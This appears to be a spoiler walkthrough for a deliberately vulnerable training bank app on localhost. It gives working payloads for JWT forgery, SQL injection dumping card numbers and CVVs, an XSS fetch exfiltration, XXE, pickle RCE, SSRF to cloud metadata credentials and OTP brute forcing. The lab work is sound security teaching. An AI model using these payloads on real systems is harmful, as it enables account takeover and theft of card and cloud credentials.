# OnlineBank — challenge walkthroughs (spoilers)

Every solution below was executed against a running stand. `TOKEN` means the
`Authorization: Bearer ...` header value of a logged-in session. Login flow in
short:

```bash
CH=$(curl -s -X POST http://localhost:9080/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"login":"ama@onlinebank.app","password":"OnlineBank!123"}' | jq -r .challenge_id)
# read the code: open http://localhost:9500 and click your phone
TOKEN=$(curl -s -X POST http://localhost:9080/api/v1/auth/verify-otp \
  -H 'Content-Type: application/json' \
  -d "{\"challenge_id\":\"$CH\",\"code\":\"<code>\"}" | jq -r .token)
```

Flags are submitted on the `/progress` page or via `POST /api/v1/progress/submit {"nickname","flag"}`.

---

## 1. jwt — Forge a back-office token (300)

Three independent routes; each returns the flag from
`GET /api/v1/admin/flag`.

**a) `alg:none`** — header `{"alg":"none"}`, payload `{"sub":4,"is_backoffice":true,"role":"backoffice"}`,
empty signature:

```bash
python3 - <<'EOF' > /tmp/none.jwt
import base64, json
b = lambda o: base64.urlsafe_b64encode(json.dumps(o).encode()).rstrip(b"=").decode()
print(b({"alg":"none"}) + "." + b({"sub":4,"login":"ops","role":"backoffice","is_backoffice":True}) + ".")
EOF
curl -s http://localhost:9080/api/v1/admin/flag -H "Authorization: Bearer $(cat /tmp/none.jwt)"
```

**b) Weak secret** — the secret is dictionary-grade (`onlinebank-jwt-secret`):
crack a real token offline with jwt_tool/hashcat, then sign your own:

```bash
python3 -c "import jwt; print(jwt.encode({'sub':4,'role':'backoffice','is_backoffice':True}, 'onlinebank-jwt-secret', algorithm='HS256'))"
```

**c) Algorithm confusion** — fetch `GET /api/v1/auth/jwks.json`, rebuild the
RSA public key, sign HS256 **with the public PEM bytes as the HMAC key**:

```bash
python3 exploit/jwt_confusion.py   # prints the token
```

The verifier's "corporate gateway fallback" accepts it. Flag:
`FLAG{jwt-forge-backoffice-token}`. (Shortcut: CFG-3 leaks the weak secret
straight from the debug API.)

## 2. idor — Read another customer's statement (150)

```bash
curl -s http://localhost:9080/api/v1/accounts/1004/transactions -H "Authorization: Bearer $TOKEN" | jq
```

Account 1004 belongs to `cto@onlinebank.app`; the seeded dividend transaction
description contains `FLAG{bola-statement-of-account-1004}`.

## 3. massassign — Escalate your own role (250)

```bash
curl -s -X PATCH http://localhost:9080/api/v1/profile \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"first_name":"Amara","role":"backoffice","is_backoffice":true,"daily_limit":999999}'
```

The response contains `welcome_bonus` = `FLAG{massassign-role-backoffice}`.
Reload the SPA — the "Back office" tab appears.

## 4. race — Drive an account balance below zero (300)

```bash
python3 exploit/race.py --url http://localhost:9080 --account 1001 --amount 600 --threads 10
```

Ten parallel conversions of 600.00 on a 5 430.20 balance: all requests read
the same snapshot before the 350 ms settlement pause, all pass the check, the
relative UPDATEs then stack: final balance ≈ **-569.80**. Any response with
`balance < -100` carries `settlement_desk_note` = `FLAG{race-negative-balance}`.
In Burp: send the request to Repeater, copy it to 9 tabs, "Send group in
parallel (single-packet where supported)".

## 5. sqli — Dump the card vault through search (200)

```bash
curl -s -G http://localhost:9080/api/v1/accounts/1001/transactions \
  -H "Authorization: Bearer $TOKEN" \
  --data-urlencode "search=') UNION SELECT id, NULL::timestamptz, pan, NULL::float8, cvv, holder, note, 'leak' FROM cards--" | jq
```

The card rows appear as transactions; `counterparty` holds `cards.note`, and
John Doe's card note is `FLAG{sqli-cards-union-dump}`. Time-based blind
variant: `search=x'; SELECT pg_sleep(5)--` (watch the 500 arrive after 5 s).

## 6. xss — Steal the operator console flag (250)

1. Create a support ticket whose message is the payload (or send a transfer
   with it in the description):

```html
<img src=x onerror="fetch('http://localhost:9500/send',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({phone:'+233509999999',text:document.body.innerText})})">
```

2. Log in as `ops@onlinebank.app` in a second browser profile and open
   `/backoffice` — the ticket renders, the payload runs with the operator's
   page.
3. Read your inbox on :9500: the exfiltrated page text contains the console
   banner with `FLAG{xss-ops-console-banner}`.

## 7. xxe — Read a server file through XML import (250)

`statement.xml`:

```xml
<?xml version="1.0"?>
<!DOCTYPE statement [<!ENTITY xxe SYSTEM "file:///app/secret/flag_xxe.txt">]>
<statement><account>1001</account><period>2026-08</period><note>&xxe;</note></statement>
```

Upload it in the SPA (Statements → Import) or:

```bash
curl -s -X POST http://localhost:9080/api/v1/statements/import \
  -H "Authorization: Bearer $TOKEN" -F "file=@statement.xml" | jq .fields.note
```

`FLAG{xxe-file-read-app-secret}`. Point the entity at
`http://169.254.169.254/latest/meta-data/iam/security-credentials/onlinebank-prod-role`
to chain into SSRF-1 (note: modern libxml2 builds ship without an HTTP
entity loader — the file:// read always works, the http:// variant depends
on the libxml2 build inside the image; the dedicated SSRF lab is the
webhook/avatar feature).

## 8. rce — Execute code through the legacy import (350)

```bash
python3 exploit/make_pickle.py 'cat /app/secret/flag_rce.txt' > stmt.bnk
curl -s -X POST http://localhost:9080/api/v1/statements/import \
  -H "Authorization: Bearer $TOKEN" -F "file=@stmt.bnk;filename=stmt.bnk" | jq .result
```

The response's `result` field is the command's output:
`FLAG{rce-pickle-legacy-import}`. Try `id` to prove it is really the server.

## 9. ssrf — Fetch the instance credentials (250)

```bash
WH=$(curl -s -X POST http://localhost:9080/api/v1/webhooks \
  -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/onlinebank-prod-role"}' | jq -r .id)
curl -s -X POST http://localhost:9080/api/v1/webhooks/$WH/test -H "Authorization: Bearer $TOKEN" | jq .body_preview -r
```

The body preview contains the fake cloud credentials and
`FLAG{ssrf-imds-credentials}`. The avatar import's `source` field is the second sink
(`file:///app/secret/flag_rce.txt` then `GET /uploads/avatar_*.bin`).

## 10. shadow — Find the forgotten debug API (150)

1. `http://localhost:9080/robots.txt` disallows `/api/v0/`.
2. `curl http://localhost:9080/api/v0/debug/config` → runtime config with the
   JWT secret and `FLAG{shadow-api-v0-debug-config}`.
3. `frontend/public/old-api-spec.json` (the SPA bundle) lists the same routes.

## 11. graphql — Read a secret through GraphQL (150 pts)

```bash
curl -s -X POST http://localhost:9080/api/v1/graphql \
  -H 'Content-Type: application/json' \
  -d '{"query":"{ user(id:5){ login phone secretNote cards { pan cvv } } }"}' | jq
```

`akwasi@onlinebank.app` carries `secretNote` =
`FLAG{graphql-secret-note}`. Introspection is on — open
`/api/v1/graphql` in a browser for GraphiQL and explore.

---

## Bonus labs (no flag, still fun)

- **Rounding loop:** convert 500 USD→GHS, then 33.00 USD→GHS back … or simply
  USD→GHS→USD and watch the cedi wallet grow ≈3.25 per cycle
  (`rates` come from "two providers").
- **Notations:** transfer `"0x64"` (→100.00), `"1e2"`, `"+50"`, `"-50"`
  (reverses direction), `"1e-9"`.
- **Rate-limit bypass:** hammer `verify-otp?n=1..N` or rotate
  `X-Forwarded-For`; then run `exploit/brute_otp.py`.
- **CORS:** OPTIONS with `Origin: https://evil.example` reflects; try
  `exploit/cors_steal.html` (needs a browser that allows third-party cookies).
- **Enumeration:** "Unknown login" vs "Wrong password".
- **No revocation:** change the password, keep using the old token.

## 12. Bonus — login by phone + number disclosure (no flag, AUTH-5)

```bash
curl -s -X POST http://localhost:9080/api/v1/auth/login \
  -H 'Content-Type: application/json' \
  -d '{"login":"+233501234567","password":"OnlineBank!123"}' | jq
```

The same account logs in by phone; the response carries the full
`"phone": "+233501234567"` while the web app renders `+23********67`. Watch
the request in Burp — the mask exists only in the browser.
